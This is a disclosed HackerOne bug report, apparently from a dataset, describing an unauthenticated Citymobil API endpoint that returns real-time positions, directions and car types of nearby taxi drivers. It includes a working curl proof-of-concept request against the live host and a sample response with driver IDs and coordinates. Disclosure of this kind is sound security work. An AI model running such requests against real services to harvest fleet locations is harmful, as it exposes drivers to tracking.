---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '756833'
original_report_id: '756833'
title: Public available Sensitive Information about drivers
weakness: Insecure Storage of Sensitive Information
team_handle: mailru
created_at: '2019-12-12T09:36:06.215Z'
disclosed_at: '2019-12-18T18:12:37.001Z'
has_bounty: false
visibility: full
substate: not-applicable
vote_count: 5
asset_identifier: Citymobil
asset_type: OTHER
max_severity: critical
tags:
- hackerone
- insecure-storage-of-sensitive-information
---

# Public available Sensitive Information about drivers

## Metadata

- HackerOne Report ID: 756833
- Weakness: Insecure Storage of Sensitive Information
- Program: mailru
- Disclosed At: 2019-12-18T18:12:37.001Z
- Has Bounty: No
- Visibility: full
- Substate: not-applicable

## Original Report

Domain, site, application
--
API for client app Citimobil
https://c-api.city-mobil.ru/
Version 4.33.0 (and others)

Testing environment
--
Device on any OS with internet connection
Any software to send https requests

Steps to reproduce
--
Send POST request to url "https://c-api.city-mobil.ru/getdrivers" with data:
{
        "latitude": LAT,
        "longitude": LON,
        "limit": 10,
        "method": "getdrivers",
        "radius": 5,
        "tariff_group":  [ 4 ],
        "ver": "4.33.0"
}

Actual results
--
Response will contain GEO and BUSINESS data about 10 drivers nearest to the requested point - their positions, color codes, directions and car types.  Iterating over different city locations you can get the whole information about company fleet.

The response will proceed without any authentication. So the sensitive real-time information about company fleet is public available. 

Expected results, security impact description and recommendations
--
The authentication procedure for this data should be required 

PoC, exploit code, screenshots, video, references, additional resources
--
**Request:**
```
curl -X POST --data '{ "latitude": 55.7, "limit": 10, "longitude": 37.6, "method": "getdrivers", "radius": 5, "tariff_group": [4], "ver": "4.33.0" }' https://c-api.city-mobil.ru/getdrivers
```
**Response:**
~~~
{"drivers":[{"id":"1c1f6779f893af6fe5bf4509af7366cd","lt":"55.7025061","ln":"37.5954334","direction":"3","CarColorCode":"000000","car_type":"comfort_plus"},{"id":"1a13d0daad9b6a3fa2b3d04a5b6f8c2a","lt":"55.7019682","ln":"37.6054896","direction":"3","CarColorCode":"000000","car_type":"comfort"},{"id":"c7c1634fae41a68924083af1d496d0a7","lt":"55.7014223","ln":"37.6067352","direction":"3","CarColorCode":"000000","car_type":"comfort_plus"},{"id":"f15ce054ccdaa268b16a0904b9eecdae","lt":"55.6956527","ln":"37.5972063","direction":"4","CarColorCode":"000000","car_type":"sedan"},{"id":"94ebc0fcc644bb1da4b57e7d23942e6d","lt":"55.694786","ln":"37.5982642","direction":"4","CarColorCode":"000000","car_type":"sedan"},{"id":"7251c45ee945c9cb839d69d5902b9f17","lt":"55.7009351","ln":"37.6094206","direction":"3","CarColorCode":"000000","car_type":"comfort"},{"id":"cb9dab2ba7379c3db817dd76ec68e6c5","lt":"55.6950137","ln":"37.6041883","direction":"8","CarColorCode":"000000","car_type":"sedan"},{"id":"761891d9c1129b1678c3eba616249e2b","lt":"55.6944542","ln":"37.5951122","direction":"2","CarColorCode":"000000","car_type":"sedan"},{"id":"4f0e835751cadaa5d5386f0e1374f315","lt":"55.7066516","ln":"37.6011767","direction":"7","CarColorCode":"000000","car_type":"sedan"},{"id":"2eb330cad5e5d9c87e6d0600a9ff10e8","lt":"55.7066801","ln":"37.6009127","direction":"8","CarColorCode":"000000","car_type":"comfort"}],"nearest":{"duration":420},"service_status":1}
~~~

## Impact

Get sensitive real-time information about company fleet.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
